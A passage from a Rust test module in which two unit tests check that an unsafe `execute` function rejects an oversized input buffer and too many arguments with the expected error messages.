        let result = unsafe { execute(&big, &[], None) };
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("too large"));
    }

    #[test]
    fn input_validation_rejects_too_many_args() {
        let args: Vec<String> = (0..MAX_ARGS + 1).map(|i| format!("arg{}", i)).collect();
        let result = unsafe { execute(&[0u8; 100], &args, None) };
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("too many arguments"));
    }
}
